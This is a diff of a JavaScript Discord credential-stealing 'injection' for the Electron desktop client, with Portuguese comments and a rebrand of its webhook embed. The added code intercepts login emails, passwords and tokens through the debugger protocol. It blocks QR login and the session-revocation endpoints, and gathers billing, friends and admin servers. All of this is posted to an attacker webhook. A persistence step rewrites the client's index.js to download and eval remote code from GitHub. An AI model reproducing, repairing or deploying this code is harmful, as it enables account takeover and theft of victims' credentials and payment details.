@@ -2,31 +2,23 @@ const fs = require('fs');
 const os = require('os');
 const https = require('https');
 const path = require('path');
-const querystring = require('querystring');
 const { Buffer } = require('buffer');
 const { BrowserWindow, session } = require('electron');
 
 // --- CONFIGURAÇÃO ---
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    // LINK RAW DO SEU GITHUB ABAIXO (Essencial para a auto-persistência)
-    injection_url: "https://raw.githubusercontent.com/P180EwqDeRT/1nj3ct10n/refs/heads/main/kvr",
+    injection_url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js",
     api_url: "https://discord.com/api/v9/users/@me",
     filters: {
         urls: ['/auth/login', '/auth/register', '/mfa/totp', '/mfa/codes-verification', '/users/@me']
     },
     qr_filter: { urls: ['wss://remote-auth-gateway.discord.gg/*'] },
     session_filter: { urls: [
-        'https://discord.com/api/v*/auth/sessions',
-        'https://*.discord.com/api/v*/auth/sessions',
-        'https://discordapp.com/api/v*/auth/sessions'
+        'https://discord.com/api/v*/auth/sessions*',
+        'https://*.discord.com/api/v*/auth/sessions*',
+        'https://discordapp.com/api/v*/auth/sessions*'
     ]},
-    payment_filters: {
-        urls: [
-            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-            'https://api.stripe.com/v*/tokens'
-        ]
-    },
     badges: {
         Discord_Employee: { Value: 1, Emoji: "<:8485discordemployee:1163172252989259898>" },
         Partnered_Server_Owner: { Value: 2, Emoji: "<:9928discordpartnerbadge:1163172304155586570>" },
@@ -51,7 +43,8 @@ const p3rsist = () => {
         const indexFile = path.join(appPath, 'index.js');
         const packageFile = path.join(appPath, 'package.json');
 
-        const bootstrapCode = `const https=require('https'),fs=require('fs'),path=require('path');https.get('${CONFIG.injection_url}',(res)=>{let d='';res.on('data',c=>d+=chunk);res.on('end',()=>{try{eval(d.replace('%WEBHOOK%','${CONFIG.webhook}'))}catch(e){}})}).on('error',()=>{});require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');`;
+        // Correção do 'chunk' e escape de barras para Windows
+        const bootstrapCode = `const https=require('https'),fs=require('fs'),path=require('path');https.get('${CONFIG.injection_url}',(res)=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{eval(d.replace('%WEBHOOK%','${CONFIG.webhook}'))}catch(e){}})}).on('error',()=>{});require('${path.join(resourcePath, 'app.asar').replace(/\\/g, '\\\\')}');`;
 
         if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
         fs.writeFileSync(packageFile, JSON.stringify({ name: "discord", main: "index.js" }, null, 4));
@@ -62,33 +55,35 @@ const p3rsist = () => {
 };
 
 // --- CORE UTILS ---
-const executeJS = s => {
-    const win = BrowserWindow.getAllWindows()[0];
-    return win ? win.webContents.executeJavaScript(s, true) : null;
-};
-
-const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
-
 const request = async (method, url, headers, data) => {
     const p = new URL(url);
-    const options = { protocol: p.protocol, hostname: p.host, path: p.pathname + (p.search || ""), method: method, headers: { "Access-Control-Allow-Origin": "*", ...headers } };
+    const options = { 
+        protocol: p.protocol, 
+        hostname: p.host, 
+        path: p.pathname + (p.search || ""), 
+        method: method, 
+        headers: { "Access-Control-Allow-Origin": "*", ...headers } 
+    };
     return new Promise((resolve) => {
-        const req = https.request(options, (res) => { let resD = ""; res.on("data", c => resD += c); res.on("end", () => resolve(resD)); });
+        const req = https.request(options, (res) => { 
+            let resD = ""; 
+            res.on("data", c => resD += c); 
+            res.on("end", () => resolve(resD)); 
+        });
         if (data) req.write(data); req.end();
     });
 };
 
 // --- EMBED BUILDER ---
 const hooker = async (content, token, account) => {
-    content["username"] = "Dr4g0nSec - Injection";
-    content["avatar_url"] = "https://i.imgur.com/83uCFZe.jpeg";
-    content["content"] = `\`${os.hostname()}\` - \`${os.userInfo().username}\`\n${content["content"] || ""}`;
-
+    content["username"] = "Kovarik | Injection";
+    content["avatar_url"] = "https://i.imgur.com/wH34ny3.jpeg";
+    
     const embed = content["embeds"][0];
-    embed["author"] = { "name": account.username };
-    embed["thumbnail"] = { "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp` };
-    embed["footer"] = { "text": "Created by sk4rty | Dr4g0nSec on Top!", "icon_url": "https://avatars.githubusercontent.com/u/150484081?v=4" };
-    embed["color"] = 0x250e80;
+    embed["author"] = { "name": `${account.username}#${account.discriminator} (${account.id})` };
+    embed["thumbnail"] = { "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` };
+    embed["footer"] = { "text": "Created by: Loney | Kovarik Legacy", "icon_url": "https://avatars.githubusercontent.com/u/150484081?s=400" };
+    embed["color"] = 0xffffff;
 
     const [bill, friends, servers] = await Promise.all([
         getBilling(token),
@@ -99,13 +94,13 @@ const hooker = async (content, token, account) => {
     embed["fields"].push(
         { "name": "Token", "value": `\`\`\`${token}\`\`\``, "inline": false },
         { "name": "Nitro", "value": ["`Nenhum`","`Nitro Classic`","`Nitro Boost`","`Nitro Basic`"][account.premium_type] || "`Nenhum`", "inline": true },
-        { "name": "Badges", "value": getBadges(account.flags), "inline": true },
+        { "name": "Badges", "value": getBadges(account.public_flags), "inline": true },
         { "name": "Cobrança", "value": bill, "inline": true }
     );
 
     content["embeds"].push(
-        { "title": `Amigos (${friends.totalFriends})`, "description": friends.message, "color": 0x250e80 },
-        { "title": `Servidores (${servers.totalGuilds})`, "description": servers.message, "color": 0x250e80 }
+        { "title": `Amigos (${friends.totalFriends})`, "description": friends.message, "color": 0xffffff },
+        { "title": `Servidores (${servers.totalGuilds})`, "description": servers.message, "color": 0xffffff }
     );
 
     await request("POST", CONFIG.webhook, { "Content-Type": "application/json" }, JSON.stringify(content));
@@ -116,7 +111,7 @@ const fetchAccount = async t => JSON.parse(await request("GET", CONFIG.api_url, 
 const getBadges = f => Object.values(CONFIG.badges).filter(b => (f & b.Value) === b.Value).map(b => b.Emoji).join(' ') || '`Nenhum`';
 const getBilling = async t => {
     const d = JSON.parse(await request("GET", CONFIG.api_url + "/billing/payment-sources", { "Authorization": t }));
-    return d.map(x => x.type === 1 ? '💳' : x.type === 2 ? '<:PayPal:1386523562504097862>' : '').join(' ') || '`Nenhum`';
+    return d.map(x => x.type === 1 ? '💳' : x.type === 2 ? '<:PayPal:1386523562504097862>' : '❓').join(' ') || '`Nenhum`';
 };
 const getFriends = async t => {
     const d = JSON.parse(await request("GET", CONFIG.api_url + "/relationships", { "Authorization": t }));
@@ -125,8 +120,8 @@ const getFriends = async t => {
 };
 const getServers = async t => {
     const d = JSON.parse(await request("GET", CONFIG.api_url + "/guilds?with_counts=true", { "Authorization": t }));
-    const rare = d.filter(g => g.approximate_member_count >= 50 && g.owner).map(g => g.name).slice(0, 5).join(', ');
-    return { totalGuilds: d.length, message: rare ? `**Admin em:** ${rare}` : "**Sem servidores grandes**" };
+    const rare = d.filter(g => (g.permissions & 0x8) === 0x8 && g.approximate_member_count >= 50).map(g => g.name).slice(0, 5).join(', ');
+    return { totalGuilds: d.length, message: rare ? `**Admin em:** ${rare}` : "**Sem servidores relevantes**" };
 };
 
 // --- MONITOR & INJECTION ---
@@ -134,49 +129,40 @@ const startCapture = () => {
     const win = BrowserWindow.getAllWindows()[0];
     if (!win) return setTimeout(startCapture, 1000);
 
-    p3rsist(); // Mantém a injeção viva
+    p3rsist();
 
-    // Bloqueio de QR Code
+    // Bloqueios de Segurança (QR e Sessões) usando CONFIG.session_filter
     session.defaultSession.webRequest.onBeforeRequest(CONFIG.qr_filter, (d, c) => c({ cancel: true }));
+    session.defaultSession.webRequest.onBeforeRequest(CONFIG.session_filter, (d, c) => c({ cancel: true }));
+    session.defaultSession.webRequest.onBeforeSendHeaders(CONFIG.session_filter, (d, c) => c({ cancel: true }));
 
-    session.defaultSession.webRequest.onBeforeRequest(session_filter, (details, callback) => {
-    // Se for uma tentativa de buscar as sessões (GET), nós cancelamos.
-    if (details.method === "GET" || details.url.includes("sessions")) {
-        return callback({ cancel: true });
-    }
-    callback({ cancel: false });
-    });
-
-    session.defaultSession.webRequest.onBeforeSendHeaders(session_filter, (details, callback) => {
-    callback({ cancel: true });
-    });
-
-    // Debugger para Login/Senha
+    // Debugger Protocol (Captura estável)
     if (!win.webContents.debugger.isAttached()) {
-        win.webContents.debugger.attach('1.3');
-        win.webContents.debugger.on('message', async (_, method, params) => {
-            if (method !== 'Network.responseReceived') return;
-            if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-            if (![200, 202].includes(params.response.status)) return;
+        try {
+            win.webContents.debugger.attach('1.3');
+            win.webContents.debugger.on('message', async (_, method, params) => {
+                if (method === 'Network.requestWillBeSent' && params.request.url.endsWith('/login')) {
+                    const postData = JSON.parse(params.request.postData);
+                    global.loginTmp = postData.login;
+                    global.passTmp = postData.password;
+                }
 
-            const res = await win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
-            const post = await win.webContents.debugger.sendCommand('Network.getRequestPostData', { requestId: params.requestId });
-            const resData = JSON.parse(res.body);
-            const postData = JSON.parse(post.postData);
-
-            if (params.response.url.endsWith('/login') && resData.token) {
-                const acc = await fetchAccount(resData.token);
-                hooker({
-                    "content": "**Login Realizado!**",
-                    "embeds": [{ "fields": [
-                        { "name": "Email", "value": `\`${postData.login}\``, "inline": true },
-                        { "name": "Senha", "value": `\`${postData.password}\``, "inline": true }
-                    ]}]
-                }, resData.token, acc);
-            }
-            // Adicionar lógica de MFA e /@me conforme necessário aqui
-        });
-        win.webContents.debugger.sendCommand('Network.enable');
+                if (method === 'Network.responseReceived' && params.response.url.endsWith('/login') && params.response.status === 200) {
+                    const { body } = await win.webContents.debugger.sendCommand('Network.getResponseBody', { requestId: params.requestId });
+                    const { token } = JSON.parse(body);
+                    const acc = await fetchAccount(token);
+                    
+                    await hooker({
+                        "content": `**Login Detectado no Host:** \`${os.hostname()}\``,
+                        "embeds": [{ "fields": [
+                            { "name": "Email", "value": `\`${global.loginTmp}\``, "inline": true },
+                            { "name": "Senha", "value": `\`${global.passTmp}\``, "inline": true }
+                        ]}]
+                    }, token, acc);
+                }
+            });
+            win.webContents.debugger.sendCommand('Network.enable');
+        } catch (e) {}
     }
 };
 
